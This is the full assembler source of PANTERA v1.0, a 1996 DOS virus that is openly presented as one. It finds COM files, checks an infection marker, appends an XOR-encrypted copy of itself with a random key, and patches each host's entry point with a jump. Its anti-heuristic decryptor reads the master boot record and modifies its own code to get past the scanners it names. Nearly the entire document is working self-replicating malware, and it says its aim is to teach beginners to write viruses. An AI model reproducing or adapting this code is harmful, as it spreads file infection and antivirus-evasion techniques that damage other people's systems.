;  ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;  ³ PANTERA v1.0 (C) 1996    ³
;  ³ Copyrigth (C) by Grosser ³
;  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;  ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;  ³Turbo Assembler 3.2                          ³
;  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;   First virus in assembler FULLY written by Grosser 
;   Great Thanks to the Master - LovinGod 
;   Anti-heuristic procedure designed by Grosser
;   With the main help of LovinGod
;
;  ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
;  º Version 1.0                                              º 
;  º                                                          º 
;  º Name       : PANTERA (metal group)                       º           
;  º Type       : COM, CRYPT, Non-resident with ANTIHEURISTIC º
;  º Undetected : WEB 3.17, AVP, TBAV                         º
;  º Length     : 486 bytes                                   º
;  ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
;
;  This is my first real virus fully written in assembler.
;  Its only purpose is to learn to write serious viruses
;  and to teach beginners.
;

.model tiny                         ; model tiny - for COM files

cseg segment                        ; declare our segment
assume cs:cseg;ds:cseg;es:es_seg    ; declare segment registers

org 100h                            ; 100h offset from PSP

start:                              ; Virus start

jmp beg
nop                                 ; This 2 nops serve as label
nop                                 ; for later identification

mov ah, 9                           ; AH = 9 (display text string)
mov dx, offset txt1
int 21h                             ; Call DOS
int 20h                             ; HALT
txt1 db 'MAIN PROGRAM',10,13,'$'    ; text string
db 100h dup (0)                     ; 256 bytes (100h) - for 3 bytes jump
;=============================================================================
BEG:
NOP
NOP ;33ED - xor bp,bp
NOP
MOV BP,57C7h                        ;BP - Our address 
NOP

                                    ;BP is now set to BEG

mov ax, 0201h                       ; This is an anti-heuristic procedure
mov cx,1                            ; Web doesn't write COM.Virus 
mov dx,80h                          ; Set parameters to MBR
mov bx,bp                              
sub bx,55aah
add bx,sbuf-beg
int 13h                             ; Read it
mov ax,[bx][1FEh]                   ; Substract BP, 55AA (end sector marker)
xchg ah,al                          ; Web won't substract in in the right way
sub bp,ax                           ; AND WON'T BE ABLE TO DECRYPT MAIN BODY


;================= HERE GOES THE DECRYPTOR ==============
mov cx, len2                  ; CX - virus length
mov si, bp                    ; SI - begin virus
add si, crypted-beg

mov al, [bp+key-beg]          ; Move key for decrypting to AL


mov byte ptr cs:[bp],02Eh     ; This is anti-heuristic trick
mov word ptr cs:[bp+1],0430h  ; for crypt code
mov word ptr cs:[bp+3],0C3h   ; Command in the [BP]: xor byte ptr cs:[si],al


lab1:                         
call bp                       ; Call bp -> xor byte ptr cs:[si],al
inc si                        ; Increase counter
loop lab1                     ; Do it CX times

mov byte ptr cs:[bp],090h     ;
mov word ptr cs:[bp+1],0ED33h ; write XOR BP,BP (BP=0)

mov word ptr cs:[bp+3],00BDh   ;
mov word ptr cs:[bp+5],9000h   ;restore old bytes 



;========================================================




; === Crypted part goes here === 

CRYPTED:
                       ; Restore old 5 bytes 

MOV SI, BP             ; SI (Source Index) = BP (begin virus)
ADD SI, old5-BEG       ; Calculate SI
MOV DI, 100H           ; DI (Destination Index) = 100h (begin program)
cld                    ; Clear Direction ( will do increasing move )
mov cx,5               ; CX times
rep MOVSB              ; Move bytes from SI to DI



                       ; Save DTA

mov si, 80h            ; SI = DTA address 80h
mov di, bp             ; DI = FDTA variable
add di, fdta-beg        
cld                     
mov cx, 80h            ; 80h times
rep movsb              ; Move SI -> DI



                      ; Search for files

mov ah, 4eh           ; Find First
mov dx, bp            ; DX - file mask (*.com)
add dx, fmask-beg
mov cx, 00100000b     ; all attributes  
int 21h               ; Do it
jnc m1                ; if error then jump to err1

jmp err1
m1:

nextf:

mov bx,0                          ; bx (counter) - 0
mov byte ptr cs:[bp+fname+13],0   ; 0 at the end of the file - required


mov di, bp                        ; DI - file name
add di, fname-beg

mov si, 80h+1eh                   ; SI - 80h(DTA) + 1Eh (offset for filename)

cld                               ; Clear Direction
mov cx, 12                        ; CX times
l1:
lodsb                             ; Load [DS:SI] (filename from DTA) -> AL  
stosb                             ; Save AL -> [DS:DI] (fname variable)
cmp al, 0                         ; If AL=0 then finished
je exit1

loop l1
exit1:

                  ; CHECK FOR "ALREADY INFECTED"

mov ah, 3dh       ; DOS func. Open file
mov al, 02h       ; 02h - read/write
mov dx, bp        ; DX - filename
add dx, fname-beg
int 21h           ; Do It         
jc pte            ; errors -> jump to error label 
mov bx,ax         ; save file handler to BX

mov ax,4200h      ; Seek to file position 3
xor cx,cx         ; CX = 0
mov dx,3          ; DX = 3
int 21h           ; Do It
jc pte            ; errors -> jump

mov ah, 3fh       ; Read 2 bytes (no. 4-5)
mov cx, 2         ; Number of bytes
mov dx, bp        ; Read to CHK variable
add dx, chk-beg
int 21h           ; Do It
jc pte            ; errors -> jump

mov ah, 3eh       ; Close file
int 21h           ; Do It
jc pte            ; errors -> jump



cmp word ptr [bp+chk-beg],9090h    ; if not 2 nops (see above) then it's not infected
jne infect                         ; jump infect 

mov ah, 4fh       ;Find Next File
int 21h
jnc nextf


pte:
jmp err1



infect:           ; Infection procedure

mov ah, 3dh       ; Open file
mov al, 02h       ; for read/write
mov dx, bp        ; DX - filename
add dx, fname-beg
int 21h           ; DO IT
jnc lh1           ; if no errors jump to LH1
jmp err1          ; if errors jump err1
lh1:              ; THIS IS DONE IS THIS WAY, 
                  ; BECAUSE ONLY JMP CAN BE LONG JUMP

mov bx,ax         ; save handler

mov ax,4200h      ; Seek to file beginning
xor cx,cx         ; CX = 0
xor dx,dx         ; DX = 0
int 21h           ; Do It
jnc lh2

jmp err1          ; the same thing
lh2:

mov ah, 3fh       ; Save original 5 bytes
mov cx, 5         ; CX - count
mov dx, bp        ; DX - old5 variable
add dx, old5-beg
int 21h           ; Do it
jnc LLL1
jmp err1

LLL1:
mov ax,4202h      ; Dos Func. LSEEK (AH=42) (AL=02 offset from end)
xor cx,cx         ; CX = 0
xor dx,dx         ; DX = 0
int 21h           ; Do it  (seek to the end)
jc err1

mov ax, 4201h     ; Get file size into SIZ variable
xor cx,cx         ; CX = 0
xor dx,dx         ; DX = 0
int 21h           ; Do it
jc err1

sub ax, 3                     ; Substract AX, 3 
                              ; (because our JMP command = 3 bytes)
mov word ptr [bp+siz-beg], ax ; Move AX to SIZ

add ax, 103h                  ; because of 1st NOP
add ax, 55AAh
mov word ptr cs:[bp+4],ax     ; MOV siz to virus begin + 4 = (MOV BP,...)

;===============================================================
in al, 40h                      ; Creating random key
mov byte ptr [bp+key-beg], al   ; Move AL to Key

mov si, bp                      ; Copy Active Body To Block
mov di, bp                      ; SI - source
add di, block-beg               ; DI - dest
mov cx, len                     ; CX times
cld
rep movsb                       ; Do it

mov si, bp                      ; Set SI to Block + Decryptor Size 
                                ; (Decryptor shouldn't be crypted)

add si, block-beg+crypted-beg   ; In other words - (SI points to Crypted)

mov cx, len                     ; Set CX to virus length - Decryptor Size
sub cx, crypted-beg+1            


lab2:
xor byte ptr cs:[si], al        ; Xor Block
inc si
loop lab2


;=================================================================
mov ah, 40h       ; Write block
mov cx, len       ; Len - virus length
mov dx, bp        ; DX - block address
add dx, block-beg
int 21h           ; Do it
jc err1

mov ax,4200h      ; Seek to file beginning
xor cx,cx
xor dx,dx
int 21h
jc err1

mov ah, 40h       ; Write jumper
mov cx, 5         ; 5 bytes
mov dx, bp        ; JMP_OP address
add dx, jmp_op-beg
int 21h           ; Do It
jc err1

mov ah, 3eh       ; Close file
int 21h
jc err1




JMP OK_

ERR1:

OK_:

;Restore DTA
mov di, 80h         ; DI - 80h
mov si, bp          ; SI - FDTA
add si, fdta-beg
cld
mov cx, 80h         ; 80h times
rep movsb           ; Do It


mov di, 100h        ; Move 100h to Di
push di             ; Save 100h to Stack

xor ax,ax           ; Clear all registers
xor bx,bx
xor cx,cx
xor dx,dx

mov si,ax
mov di,ax

xor bp,bp


RETN                ; Return near (RETN returns to the last number from stack)
                    ; So it will go the 100h address - the begin of the program

ENDVIR:

                                   ; Variables 
erm db 'PANTERA V1.0',10,13,'$'    ; Virus Label
jmp_op db 0e9h                     ; JMP opcode
siz  dw 0                          ; Size
     db 90h,90h        

old5 db 5 dup (90h)                ; Old 5 bytes
fmask db '*.com',0                 ; File Mask
key db 0                           ; Xor Key
len equ $-beg                      ; LEN = CONST (virus size)

                                   ; Undefined Data

fname db 13 dup (?)                ; File Name
chk db ?,?                         ; Bytes to identificate
fdta db 80h dup (?)                ; FDTA
block db len dup (?)               ; Block to crypt
len2 equ $-beg                     ; Len2
sbuf db 512 dup (?)                ; sbuf - for antiheuristic

cseg ends                          ; end of cseg segment

es_seg segment
es_seg ends
end start                          ; end of program
